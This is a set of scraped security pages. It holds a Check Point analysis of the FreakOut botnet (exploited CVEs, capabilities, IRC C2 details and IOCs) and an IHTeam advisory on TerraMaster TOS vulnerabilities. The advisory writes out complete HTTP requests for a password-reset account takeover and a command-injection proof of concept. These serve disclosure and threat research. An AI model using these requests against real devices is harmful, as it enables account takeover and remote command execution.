=== Content from research.checkpoint.com_123823d9_20250119_124141.html ===

[![](https://research.checkpoint.com/wp-content/uploads/2024/06/CPR-by-Check-Point-logo.svg)](https://research.checkpoint.com)

* [CONTACT US](https://research.checkpoint.com/contact/)
* [DISCLOSURE POLICY](https://research.checkpoint.com/disclosure-policy/)
* [CHECKPOINT.COM](https://www.checkpoint.com/)
* [UNDER ATTACK?](https://www.checkpoint.com/about-us/contact-incident-response/)

[![](https://research.checkpoint.com/wp-content/uploads/2024/06/CPR-by-Check-Point-logo.svg)](https://research.checkpoint.com)

* [Latest Publications](https://research.checkpoint.com/latest-publications/)
* [CPR Podcast Channel](https://research.checkpoint.com/cpr-podcast-channel/)
* [Web 3.0 Security](https://research.checkpoint.com/category/web3/)
* [Intelligence Reports](https://research.checkpoint.com/intelligence-reports/)
* Resources
  + [ThreatCloud AI](https://www.checkpoint.com/ai/)
  + [Threat Intelligence & Research](https://www.checkpoint.com/solutions/threat-intelligence-research/)
  + [Zero Day Protection](https://www.checkpoint.com/infinity/zero-day-protection/)
  + [Sandblast File Analysis](http://threatemulation.checkpoint.com/)
* [About Us](https://research.checkpoint.com/about-us/)
* [SUBSCRIBE](https://research.checkpoint.com/subscription/)

SUBSCRIBE

## CATEGORIES

* [Android Malware
  23](https://research.checkpoint.com/category/android-malware/)
* [Artificial Intelligence
  4](https://research.checkpoint.com/category/artificial-intelligence-2/)
* [ChatGPT
  3](https://research.checkpoint.com/category/chatgpt/)
* [Check Point Research Publications
  396](https://research.checkpoint.com/category/threat-research/)
* [Cloud Security
  1](https://research.checkpoint.com/category/cloud-security/)
* [CPRadio
  44](https://research.checkpoint.com/category/cpradio/)
* [Crypto
  2](https://research.checkpoint.com/category/crypto/)
* [Data & Threat Intelligence
  1](https://research.checkpoint.com/category/data-threat-intelligence/)
* [Data Analysis
  0](https://research.checkpoint.com/category/data-analysis/)
* [Demos
  22](https://research.checkpoint.com/category/demos/)
* [Global Cyber Attack Reports
  338](https://research.checkpoint.com/category/threat-intelligence-reports/)
* [How To Guides
  13](https://research.checkpoint.com/category/how-to-guides/)
* [Ransomware
  2](https://research.checkpoint.com/category/ransomware/)
* [Russo-Ukrainian War
  1](https://research.checkpoint.com/category/russo-ukrainian-war/)
* [Security Report
  1](https://research.checkpoint.com/category/security-report/)
* [Threat and data analysis
  0](https://research.checkpoint.com/category/threat-and-data-analysis/)
* [Threat Research
  172](https://research.checkpoint.com/category/threat-research-2/)
* [Web 3.0 Security
  9](https://research.checkpoint.com/category/web3/)
* [Wipers
  0](https://research.checkpoint.com/category/wipers/)

![](https://research.checkpoint.com/wp-content/uploads/2021/01/LinuxCVEs_blog_header.jpg)

# FreakOut – Leveraging Newest Vulnerabilities for creating a Botnet

January 19, 2021

https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/

Research By: Omer Ventura, Ori Hamama, Network Research

# Introduction

Recently, Check Point Research encountered several attacks that exploited multiple vulnerabilities, including some that were only recently published, to inject OS commands. The goal behind the attacks was to create an IRC botnet, which can later be used for several purposes, such as DDoS attacks or crypto-mining.

The attacks aim at devices that run one of the following:

* TerraMaster TOS(TerraMaster Operating System) – the operating system used for managing TerraMaster NAS (Network Attached Storage) servers
* Zend Framework –  a collection of packages used in building web application and services using PHP, with more than 570 million installations
* Liferay Portal – a free, open-source enterprise portal. It is a web application platform written in Java that offers features relevant for the development of portals and websites

![Figure1](//research.checkpoint.com/wp-content/uploads/2021/01/Figure1-1.png)

**Figure 1:** The products attacked by the campaign.

Each of the infected devices can be later used as an attacking platform, thus making the attack flow recursive. In a later variant, Xmrig causes the victim’s device to engage in coin-mining.

# FreakOut Infection Chain

![The attack flow of the campaign](//research.checkpoint.com/wp-content/uploads/2021/01/image1.png)

**Figure 2:** The attack flow of the campaign.

The campaign exploits these recent vulnerabilities: CVE-2020-28188, CVE-2021-3007 and CVE-2020-7961. These allow the attacker to upload and execute a Python script on the compromised servers.

### **CVE-2020-28188**

The vulnerability is caused by a lack of input validation in the “event” parameter in the “makecvs” PHP page (/include/makecvs.php). This allows a remote unauthenticated attacker to inject OS commands, and gain control of the servers using TerraMaster TOS (versions prior to  4.2.06).

![The attack exploiting CVE-2020-28188 as seen in the logs.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure3.png)

**Figure 3:** The attack exploiting CVE-2020-28188 as seen in our sensors.

### **CVE-2021-3007**

This vulnerability is caused by the unsecured deserialization of an object. In versions higher than Zend Framework 3.0.0, the attacker abuses the Zend3 feature that loads classes from objects in order to upload and execute malicious code in the server. The code can be uploaded using the “callback” parameter, which in this case inserts a malicious code instead of the “callbackOptions” array.

![The attack exploiting CVE-2021-3007 as seen in the logs.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure4.png)

**Figure 4:** The attack exploiting CVE-2021-3007 as seen in our sesnors.

### **CVE-2020-7961**

The vulnerability is a Java unmarshalling vulnerability via JSONWS in Liferay Portal (in versions prior to 7.2.1 CE GA2). Marshalling, which is similar to serialization, is used for communication with remote objects, in our case with a serialized object. Exploiting the vulnerability lets the attacker provide a malicious object, that when unmarshalled, allows remote code execution.

![](//research.checkpoint.com/wp-content/uploads/2021/01/Figure5.png)

**Figure 5:** The attack exploiting CVE-2020-7961 as seen in our sensors.

In all the attacks involving these CVEs, the attacker’s first move is to try running different syntaxes of OS commands to download and execute a Python script named “out.py”.
After the script is downloaded and given permissions (using the “chmod” command), the attacker tries to run it using Python 2. Python 2 reached EOL (end-of-life) last year, meaning the attacker assumes the victim’s device has this deprecated product installed.

#

# The Python Code – out.py

The malware, downloaded from the site http://gxbrowser[.]net, is an obfuscated Python script consisting of polymorphic code. Many of the function names remain the same in each download, but there are multiple functions that are obfuscated using random strings generated by a packing function. The first attack trying to download the file was observed on January 8, 2021. Since then, hundreds of download requests from the relevant URL were made.

![The __init__ function of the main class of the code “out.py”. The code is obfuscated and encoded with several different functions. Each time it is downloaded, the code is obfuscated anew. differently.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure6.png)

**Figure 6:** The *\_\_init\_\_* function of the main class of the code *“out.py”.* The code is obfuscated and encoded with several different functions. Each time it is downloaded, the code is obfuscated anew. differently.

When we searched for the relevant domain and file in VirusTotal (VT), we found other codes called “out.py”.
These files were uploaded only a few hours before the attacks began, and had low scores of detections by the AVs presented in VirusTotal. All the files originated from the same domain, hxxp://gxbrowser[.]net, as this address is hardcoded in all scripts and is the only address that appears.

![Other codes related to the domain and IP.  Both are Python-based although the second is classified as Java.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure7.png)

**Figure 7:** Other codes related to the domain and IP. Both are Python-based although the second is classified as Java.

When we examined the first variation uploaded to VT (the third one in Fig.7) with our script, and compared the codes and their functions, it seemed to be a slightly earlier version of the code.

![Comparing the different files. They have some similarities in function names and comments that shed some light on the more obfuscated code.](//research.checkpoint.com/wp-content/uploads/2021/01/figure8-with_colors-1.png)

**Figure 8:** Comparing the different files. They have some similarities in function names and comments that shed some light on the more obfuscated code.

The code itself is less obfuscated, includes comments, and seems to be related to our attacker.

![Figure 9: An earlier version of the same function presented in Fig.3. This time it contained developer comments revealing some of the variables’ purposes.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure9.png)

**Figure 9:** An earlier version of the same function presented in Fig.6. This time it contained developer comments revealing some of the variables’ purposes.

In addition, in this version, the attacker left a calling card with relevant information, including the code developer’s name and an update that took place on January 1, 2021. All this information was omitted in the version we studied

![A calling card left in the earlier version of the code](//research.checkpoint.com/wp-content/uploads/2021/01/Figure10.png)

**Figure 10:** A calling card left in the earlier version of the code.

Comparing the two codes and the different comments helped reveal the code communication methods, the capabilities and the threat actor behind it.

# The Malware Capabilities

At this point, the facilities and capabilities of the malware became clearer.

There is a specific function for each of the main capabilities, making the code very modular and easy to change or maintain:

* Port Scanning utility
* Collecting system fingerprint
  + Includes the device address (MAC, IP), and memory information. These are used in different functions of the code for different checks
  + TerraMaster TOS version of the system
* Creating and sending packets
  + ARP poisoning for Man-in-the-Middle attacks.
  + Supports UDP and TCP packets, but also application layer protocols such as HTTP, DNS, SSDP, and SNMP
  + Protocol packing support created by the attacker.
* Brute Force – using hard coded credentials
  + With this list, the malware tries connecting to other network devices using Telnet. The function receives an IP range and tries to brute force each IP with the given credential. If it succeeds, the results of the correct credential are saved to a file, and sent in a message to the C2 server
* Handling sockets
  + Includes handling exceptions of runtime errors.
  + Supports multi-threaded communication to other devices. This allows simultaneous actions the bots can perform while listening to the server
* Sniffing the network
  + Executes using the “ARP poisoning” capability. The bot sets itself as a Man-in-the-Middle to other devices. The intercepted data is sent to the C2 server
* Spreading to different devices, using the “exploit” function.
  + Randomly generates the IPs to attack
  + Exploits the CVEs mentioned above (CVE-2020-7961 , CVE-2020-28188, CVE-2021-3007)
* Gaining persistence by adding itself to the rc.local configuration.
* DDOS and Flooding – HTTP, DNS, SYN
  + Self-implementation of Slowlaris. The malware creates many sockets to a relevant victim address for the purpose of instigating a DDoS attack
* Opening a reverse-shell – shell on the client
* Killing a process by name or ID
* Packing and unpacking the code using obfuscation techniques to provide random names to the different functions and variables

![Part of the function exploit, which is responsible for the spreading attempts. Exploits CVE-2020-7961, CVE-2020-28188 and CVE-2021-3007, after clarification.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure11.png)

**Figure 11:** Part of the function *exploit*, which is responsible for the spreading attempts. Exploits CVE-2020-7961, CVE-2020-28188 and CVE-2021-3007, after clarification.

# The Malware’s Communication

Each infected device is configured to communicate with a hardcoded C2 server. All the connection credentials are obfuscated and encoded in the code itself multiple times, and are generated using multiple functions.

At the initial connection to the server, the conversation begins with the client sending a “NICK message”, which declares the user nickname. The nickname is generated with this format:

**[HAX|**System OS**|**Machine Type**|**CPU count**] **8-12 random letters****

An example of the bot nickname as created by the script:

**[HAX|**Linux**|**x86\_64**|**3**] **QCRjbbnQm****

After declaring the nickname of the client, the client sends the username, which is the nickname plus the IRC address and the string “localhost  :”, followed by the bot nickname. When the server accepts this message, the communication begins.

Following a quick back and forth set of Ping-Pong messages, the server provides the client server information about the channels. Then, one minute later, the client can join channels on the server.

In FreakOut, the relevant channel was “#update” on the server “gxbrowser[.]net”.  The user must provide a channel key, used as a password, to connect to the channel. The key can be extracted from the code, and is equal to the string “N3Wm3W”.

![Communication with the server. Initiates the conversation with the relevant messages.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure12.png)

**Figure 12:** Communication with the server. Initiates the conversation with the relevant messages.

The client can now be used as a part of a botnet campaign and accepts command messages from the server to execute. The commands are sent using a symbols-based communication. Each message sent by the server is parsed and split into different symbols, with each one having a different meaning.

Every message includes the command name (i.e: udpflood, synflood) and the rest of the arguments change accordingly. When the client finishes executing the relevant command as received from C2, it then sends the results in a private message (PRIVMSG IRC command) to the relevant admin in the channel, providing it with relevant details.

![Communication with the server. The server accepts commands in the format mentioned above. ](//research.checkpoint.com/wp-content/uploads/2021/01/Figure13.png)

**Figure 13:** Communication with the server. The server accepts commands in the format mentioned above.

#

# The Impact

Based on the malware features, it seems that the attacker can use the compromised systems for further attacks, such as using the system resources for crypto-mining, spreading laterally across the company network, or launching attacks on outside targets while masquerading as the compromised company. We revealed further information about FreakOut when we used the algorithm-created credentials to connect to the server. After logging in, additional server information is provided to the client, including the room’s capacity, the users connected and even operators and unknown connections.

![After logging in, more information is provided about the server.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure14.png)

**Figure 14:** After logging in, more information is provided about the server.

The server was created in late November 2020 and has been running ever since with 300 current users and 5 channels. Exploring the different channels revealed a very active one, called #update. This channel includes 186 exploited devices communicating with the server, as seen in the messages exchanged between the IRC server and the client, and in the channel page:

![](//research.checkpoint.com/wp-content/uploads/2021/01/Figure15a.png)![](//research.checkpoint.com/wp-content/uploads/2021/01/Figure15b.png)

**Figure 15:** The #update channel, as seen in the IRC communication with the malware and in the IRC channel surfed through a web interface.

We observed two additional channels called “opers” (which probably stands for operators as we have seen the server admin there), and “andpwnz”. The network name of the server is called “Keknet”. Due to the fact the file was updated and released in January 2021, we believe this scale was reached in less than a week. Therefore, we can assume that this campaign will ratchet up to higher levels in the near future.

#

# Threat Actors

To identify the threat actors responsible for the attacks, we searched for leads in the internet and social media.  Searching for both the code author, who goes by the name “Freak” (which we have also seen in the IRC server channels) and the IRC bot name “N3Cr0m0rPh”, revealed information about the threat actor behind the campaign.

In a post published on HackForums back in 2015, submitted by the user “Fl0urite” with the title “N3Cr0m0rPh Polymorphic IRC BOT”, the bot is offered for sale in exchange for BitCoins (BTC). This bot seem to have many of the same capabilities as the current one, and the same description as the current bot in the calling card. However, some of the features were omitted over the years, such as the USB worm and the regedit ability.

![The post submitted by “Fl0urite” back in 2015. The name of the IRC bot is the same, with many similar capabilities. ](//research.checkpoint.com/wp-content/uploads/2021/01/Figure16.png)

**Figure 16:** The post submitted by “Fl0urite” back in 2015. The name of the IRC bot is the same, with many similar capabilities.

The name “Fl0urite” is mentioned in other hacking forums and GitHub, and is associated with multiple pieces of code which can be found on these sites that resemble the current malware code functions.

As mentioned previously, “Freak@PopulusControl” appears to be the author of  the latest code version. When we searched for these strings, we found several results, including an earlier version of the malware code (V6). In this version, however, the author left a comment, explaining the code is a free tool and that redistribution is allowed.

![V6](//research.checkpoint.com/wp-content/uploads/2021/01/1.png)

**Figure 17:** Version 6 of the code.

As mentioned previously,  the admin in the IRC channel is also called “Freak.”

![The user “Freak” joins and leaves the #update channel on the server. ](//research.checkpoint.com/wp-content/uploads/2021/01/Figure18.png)

**Figure 18:** The user “Freak” joins and leaves the #update channel on the server.

In early 2015 codes found on Pastebin , that were uploaded by the user “Keksec”, there seems to be a link between the two identities “Fl0urite” and “Freak” in several files. In addition, there is a link to the user “Fl0urite” on HackForums in these files signed by “Freak.” The other files uploaded by the user are signed with the exact string “Freak@PopulusControl (aka sudoer)” that seems to be associated with the malware functions as well. Based on this evidence, we conclude that both identities belong to the same person.

In the Pastebin, there are also files that were uploaded recently (January 12, 2021).

![Files uploaded to Pastebin.  The author presents himself as Freak/Fl0urite. The address is related to the user “Fl0urite” in HackForums, while later files uploaded are signed only with “Freak@PopulousControl.”](//research.checkpoint.com/wp-content/uploads/2021/01/Figure1920.png)

**Figure 19-20:** Files uploaded to Pastebin. The author presents himself as Freak/Fl0urite. The address is related to the user “Fl0urite” in Hack Forums, while later files uploaded are signed only with “Freak@PopulousControl.”

The URL of the site gxbrowser[.]net reveals the following page:

![The index page of gxbrowser[.]net](//research.checkpoint.com/wp-content/uploads/2021/01/Figure21.png)

**Figure 21:** The index page of gxbrowser[.]net

The page has the names “keksec” and “Freak” which were observed in the Pastebin files, and is also associated with the name “Keknet” seen in the IRC server.

Currently, it seems that “Freak” is using it to create a botnet.

On VT, and on the relevant Pastebin mentioned previously, there are other files related to the domain such as Crypto-mining malwares. In the latest code downloaded (January 12, 2021), it seems that the malware tries to exploit the vulnerabilities to install the Xmrig from the server hxxp://gxbrowser[.]net.

![Exploit function in the newest edition of the script – clarified. The file “xmrig1” is also downloaded.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure22.png)

**Figure 22:** The file xmrig1 on the server gxbrowser[.]net

![Exploit function in the newest edition of the script – clarified. The file “xmrig1” is also downloaded.](//research.checkpoint.com/wp-content/uploads/2021/01/Figure23.png)

**Figure 23:** Exploit function in the newest edition of the script – clarified. The file “xmrig1” is also downloaded.

#

# Conclusion

FreakOut is an attack campaign that utilizes three vulnerabilities, including some newly released, to compromise different servers. The threat actor behind the attack, named “Freak”, managed to infect many devices in a short period of time, and incorporated them into a botnet, which in turn is used for DDoS attacks and crypto-mining. Such attack campaigns highlight the importance of taking sufficient precautions and updating your security protections on a regular basis. As we have observed, this is an ongoing campaign that can spread rapidly.

# MITRE ATT&CK TECHNIQUES

| [**Initial Access**](https://attack.mitre.org/tactics/TA0001) | [**Resource Development**](https://attack.mitre.org/tactics/TA0011/) | [**Execution**](https://attack.mitre.org/tactics/TA0002) | [**Persistence**](https://attack.mitre.org/tactics/TA0003) | [**Privilege Escalation**](https://attack.mitre.org/tactics/TA0004) | [**Defense Evasion**](https://attack.mitre.org/tactics/TA0005) | [**Credential Access**](https://attack.mitre.org/tactics/TA0006) | [**Discovery**](https://attack.mitre.org/tactics/TA0007/) | [**Lateral Movement**](https://attack.mitre.org/tactics/TA0008) | [**Collection**](https://attack.mitre.org/tactics/TA0009) | [**Command and Control**](https://attack.mitre.org/tactics/TA0011/) | [**Exfiltration**](https://attack.mitre.org/tactics/TA0010) | [**Impact**](https://attack.mitre.org/tactics/TA0040) |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Exploit Public-Facing Application (T1190) | Acquire infrastructure: Domains (T1583/003) | Exploitation for Client Execution (T1203) | Event Triggered Execution: .bash\_profile and .bashrc (T1546/004) | Event Triggered Execution: .bash\_profile and .bashrc (T1546/004) | Deobfuscate/Decode Files or Information (T1140) | Brute Force (T1110) | Network Service Scanning (T1046) | Remote Services (T1021) | Network Sniffing (T1040) | Application Layer Protocol (T1071) | Exfiltration over C2 Channel (T1041) | Network Denial of Service Direct Network Flood (T1498/001) |
|  | Compromise Infrastructure: Botnet (T1584/005) | Command and Scripting Interpreter (T1059) |  |  | File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification (T1222/002) | Man-in-the-Middle: ARP Cache Poisoning (T1557/002) |  | Exploitation of Remote Services (T1210) | Data Staged: Local Data Staging (T1074/001) | Application Layer Protocol: Web Protocols (T1071/001) |  | Network Denial of Service Reflection Amplification (T1498/002) |
|  |  | Command and Scripting Interpreter: Python (T1059/006) |  |  |  |  |  |  |  | Application Layer Protocol: DNS (T1071/004) |  | Resource Hijacking (T1496) |
|  |  | Command and Scripting Interpreter: Unix Shell (T1059/004) |  |  |  |  |  |  |  | Data encoding (T1132) |  |  |
|  |  |  |  |  |  | ```   ``` | ```   ``` | ```   ``` | ```   ``` | Data Obfuscation (T1001) | ```   ``` | ```   ``` |

# Protections

Check Point customers are protected by these protections:

#### IPS

* TerraMaster TOS Command Injection (CVE-2020-28188).
* Liferay Portal Insecure Deserialization (CVE-2020-7961).
* Zend Framework Remote Code Execution (CVE-2021-3007).
* CMD Injection Over HTTP

#### Anti-Bot

* Win32.IRC.G
* N3Cr0m0rPh.TC.a
* Win32.N3Cr0m0rPh.TC.a
* Win32.N3Cr0m0rPh.TC.b
* Win32.N3Cr0m0rPh.TC.c
* Win32.N3Cr0m0rPh.TC.d

#

# IOCs

* hxxp://gxbrowser[.]net
* 7c7273d0ac2aaba3116c3021530c1c868dc848b6fdd2aafa1deecac216131779 – out.py (less obfuscated)
* 05908f2a1325c130e3a877a32dfdf1c9596d156d031d0eaa54473fe342206a65 – out.py (more obfuscated)
* ac4f2e74a7b90b772afb920f10b789415355451c79b3ed359ccad1976c1857a8 – out.py (including the xmrig1 installation)
* ac6818140883e0f8bf5cef9b5f965861ff64cebfe181ff025e1f0aee9c72506cOut – xmrig1

# References

* https://kiwiirc.com/

[![](https://research.checkpoint.com/wp-content/uploads/2022/10/back_arrow.svg)

GO UP](#single-post)

[BACK TO ALL POSTS](/latest-publications/)

## POPULAR POSTS

[![](https://research.checkpoint.com/wp-content/uploads/2023/01/AI-1059x529-copy.jpg)](https://research.checkpoint.com/2023/opwnai-cybercriminals-starting-to-use-chatgpt/)

* Artificial Intelligence
* ChatGPT
* Check Point Research Publications

[OPWNAI : Cybercriminals Starting to Use ChatGPT](https://research.checkpoint.com/2023/opwnai-cybercriminals-starting-to-use-chatgpt/)

[![](https://research.checkpoint.com/wp-content/uploads/2019/01/Fortnite_1021x580.jpg)](https://research.checkpoint.com/2019/hacking-fortnite/)

* Check Point Research Publications
* Threat Research

[Hacking Fortnite Accounts](https://research.checkpoint.com/2019/hacking-fortnite/)

[![](https://research.checkpoint.com/wp-content/uploads/2022/12/OpenAIchatGPT_header.jpg)](https://research.checkpoint.com/2022/opwnai-ai-that-can-save-the-day-or-hack-it-away/)

* Artificial Intelligence
* ChatGPT
* Check Point Research Publications

[OpwnAI: AI That Can Save the Day or HACK it Away](https://research.checkpoint.com/2022/opwnai-ai-that-can-save-the-day-or-hack-it-away/)

### BLOGS AND PUBLICATIONS

[![](https://research.checkpoint.com/wp-content/uploads/2020/02/CheckPointResearchTurkishRat_blog_header.jpg)](https://research.checkpoint.com/2020/the-turkish-rat-distributes-evolved-adwind-in-a-massive-ongoing-phishing-campaign/)

* Check Point Research Publications
* Global Cyber Attack Reports
* Threat Research

February 17, 2020
### “The Turkish Rat” Evolved Adwind in a Massive Ongoing Phishing Campaign

[![](https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg)](https://research.checkpoint.com/2017/the-next-wannacry-vulnerability-is-here/)

* Check Point Research Publications

August 11, 2017
### “The Next WannaCry” Vulnerability is Here

[![](https://research.checkpoint.com/wp-content/uploads/2018/01/rubyminer.jpg)](https://research.checkpoint.com/2018/rubyminer-cryptominer-affects-30-ww-networks/)

* Check Point Research Publications

January 11, 2018
### ‘RubyMiner’ Cryptominer Affects 30% of WW Networks

[![](https://research.checkpoint.com/wp-content/uploads/2022/12/CheckPointResearchLogo_white-1-e1671590634727.png)](https://research.checkpoint.com)

* Publications
  + [Global cyber attack reports](/category/threat-intelligence-reports/)
  + [Research publications](/category/threat-research/)
  + [IPS advisories](https://advisories.checkpoint.com/advisories/)
  + [Check point blog](https://blog.checkpoint.com/)
  + [Demos](/category/demos/)
* Tools
  + [Sandblast file analysis](http://threatemulation.checkpoint.com/)
  + [ThreatCloud](https://www.checkpoint.com/infinity/threatcloud/)
  + [Threat Intelligence](https://www.checkpoint.com/solutions/threat-intelligence-research/)
  + [Zero day protection](https://www.checkpoint.com/infinity/zero-day-protection/)
  + [Live threat map](https://threatmap.checkpoint.com/)
* [About Us](https://research.checkpoint.com/about-us/)
  + [Contact Us](https://research.checkpoint.com/contact/)

### Let’s get in touch

Subscribe for cpr blogs, news and more

[Subscribe Now](/subscription/)

© 1994-2024 Check Point Software Technologies LTD. All rights reserved.

Property of [CheckPoint.com](https://www.checkpoint.com/)

[Privacy Policy](/privacy-policy/)

![](https://research.checkpoint.com/wp-content/uploads/2022/10/popup-side-image.jpg)

## SUBSCRIBE TO CYBER INTELLIGENCE REPORTS

First Name

Last Name

Country—Please choose an option—ChinaIndiaUnited StatesIndonesiaBrazilPakistanNigeriaBangladeshRussiaJapanMexicoPhilippinesVietnamEthiopiaEgyptGermanyIranTurkeyDemocratic Republic of the CongoThailandFranceUnited KingdomItalyBurmaSouth AfricaSouth KoreaColombiaSpainUkraineTanzaniaKenyaArgentinaAlgeriaPolandSudanUgandaCanadaIraqMoroccoPeruUzbekistanSaudi ArabiaMalaysiaVenezuelaNepalAfghanistanYemenNorth KoreaGhanaMozambiqueTaiwanAustraliaIvory CoastSyriaMadagascarAngolaCameroonSri LankaRomaniaBurkina FasoNigerKazakhstanNetherlandsChileMalawiEcuadorGuatemalaMaliCambodiaSenegalZambiaZimbabweChadSouth SudanBelgiumCubaTunisiaGuineaGreecePortugalRwandaCzech RepublicSomaliaHaitiBeninBurundiBoliviaHungarySwedenBelarusDominican RepublicAzerbaijanHondurasAustriaUnited Arab EmiratesIsraelSwitzerlandTajikistanBulgariaHong Kong (China)SerbiaPapua New GuineaParaguayLaosJordanEl SalvadorEritreaLibyaTogoSierra LeoneNicaraguaKyrgyzstanDenmarkFinlandSlovakiaSingaporeTurkmenistanNorwayLebanonCosta RicaCentral African RepublicIrelandGeorgiaNew ZealandRepublic of the CongoPalestineLiberiaCroatiaOmanBosnia and HerzegovinaPuerto RicoKuwaitMoldovMauritaniaPanamaUruguayArmeniaLithuaniaAlbaniaMongoliaJamaicaNamibiaLesothoQatarMacedoniaSloveniaBotswanaLatviaGambiaKosovoGuinea-BissauGabonEquatorial GuineaTrinidad and TobagoEstoniaMauritiusSwazilandBahrainTimor-LesteDjiboutiCyprusFijiReunion (France)GuyanaComorosBhutanMontenegroMacau (China)Solomon IslandsWestern SaharaLuxembourgSurinameCape VerdeMaltaGuadeloupe (France)Martinique (France)BruneiBahamasIcelandMaldivesBelizeBarbadosFrench Polynesia (France)VanuatuNew Caledonia (France)French Guiana (France)Mayotte (France)SamoaSao Tom and PrincipeSaint LuciaGuam (USA)Curacao (Netherlands)Saint Vincent and the GrenadinesKiribatiUnited States Virgin Islands (USA)GrenadaTongaAruba (Netherlands)Federated States of MicronesiaJersey (UK)SeychellesAntigua and BarbudaIsle of Man (UK)AndorraDominicaBermuda (UK)Guernsey (UK)Greenland (Denmark)Marshall IslandsAmerican Samoa (USA)Cayman Islands (UK)Saint Kitts and NevisNorthern Mariana Islands (USA)Faroe Islands (Denmark)Sint Maarten (Netherlands)Saint Martin (France)LiechtensteinMonacoSan MarinoTurks and Caicos Islands (UK)Gibraltar (UK)British Virgin Islands (UK)Aland Islands (Finland)Caribbean Netherlands (Netherlands)PalauCook Islands (NZ)Anguilla (UK)Wallis and Futuna (France)TuvaluNauruSaint Barthelemy (France)Saint Pierre and Miquelon (France)Montserrat (UK)Saint Helena, Ascension and Tristan da Cunha (UK)Svalbard and Jan Mayen (Norway)Falkland Islands (UK)Norfolk Island (Australia)Christmas Island (Australia)Niue (NZ)Tokelau (NZ)Vatican CityCocos (Keeling) Islands (Australia)Pitcairn Islands (UK)

Email

## We value your privacy!

BFSI uses cookies on this site. We use cookies to enable faster and easier experience for you. By continuing to visit this website you agree to our use of cookies.

ACCEPT
REJECT



=== Content from packetstormsecurity.com_c4a2c572_20250119_124140.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.

=== Content from www.ihteam.net_6196b624_20250119_141437.html ===

[Skip to the content](#site-content)
[![IHTeam Security Blog](https://www.ihteam.net/wp-content/uploads/smlogo_2.png)](https://www.ihteam.net/)IHTeam Security Blog

Menu

* [Home](/)
* [Papers](https://www.ihteam.net/papers_tutorial/)

Close Menu

* [Home](/)
* [Papers](https://www.ihteam.net/papers_tutorial/)

Categories
[Advisories](https://www.ihteam.net/advisory/)
# TerraMaster TOS Multiple Vulnerabilities

* Post author

  By r00t
* Post date

  [12 December 2020](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/)
* [2 Comments on TerraMaster TOS Multiple Vulnerabilities](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/#comments)

TerraMaster is well known for producing data storage devices (NAS and DAS) since 2010. TOS is the name of their web interface to manage functionalities of the device.

The product is not new to security vulnerabilities, as Joshua M. of ISE highlighted back in 2018 (https://blog.securityevaluators.com/terramaster-nas-vulnerabilities-discovered-and-exploited-b8e5243e7a63).
In 2020, IHTeam performed a security review of the current TOS version 4.2.06 and identified the following:
CVE-2020-28184 – XSS
CVE-2020-28185 – User Enumeration
CVE-2020-28186 – Email Injection
CVE-2020-28187 – Directory Traversal
CVE-2020-28188 – Remote Command Execution
CVE-2020-28190 – Software Update Man-in-the-middle
CVE-2020-29189 – Incorrect Access Control

At the moment of writing Shodan has found around 1000 vulnerable TOS exposed on Internet – <https://www.shodan.io/search?query=X-Powered-By%3A+TerraMaster>

## **Account Takeover**

CVE-2020-28186 – The Forget Password functionality was found to be vulnerable to email injection, allowing an attacker to receive a verification code to a third-party email. This attack only works if the user specified a ‘Security email’ on the account.

The first step is to identify valid account (CVE-2020-28185) with security email set via:

`POST /wizard/initialise.php HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 28
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.1.206:8181

tab=checkuser&username=testaccount`

The response will look like the following:
`{"username":"testaccount","email":"[[email protected]](/cdn-cgi/l/email-protection)","status":1}`

We can now proceed requesting the password reset code via:

`POST /wizard/initialise.php HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 41
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.206:8181
Referer: http://192.168.1.206:8181/wizard/getpass.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

tab=validmail&email=<valid_user@email>,<attacker_controlled@email>`

Both user and attacker will receive the verification code thanks to email injection (comma separated emails); At this point we can validate the code (the cookie value must be lowercase):

`POST /wizard/initialise.php HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 25
Accept: /
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.206:8181
Referer: http://192.168.1.206:8181/wizard/getpass.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: check_mail=frskzi
Connection: close

tab=checkcode&code=FrSkzI`

And finally reset the user’s password via:

`POST /wizard/initialise.php HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 82
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.206:8181
Referer: http://192.168.1.206:8181/wizard/getpass.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: check_mail=frskzi
Connection: close

tab=checkpass&username=testaccount&email=<valid_user@email>&code=FrSkzI&passwd=NewPassw0rdH3r3`

## **Unauthenticated Remote Command Execution**

CVE-2020-28188
Vulnerable page: */include/makecvs.php*
Vulnerable parameter: *Event*

Proof of Concept:
`GET /tos/index.php?explorer/pathList&path=%60touch%20/tmp/file%60 HTTP/1.1
Host: 192.168.1.206:8181`

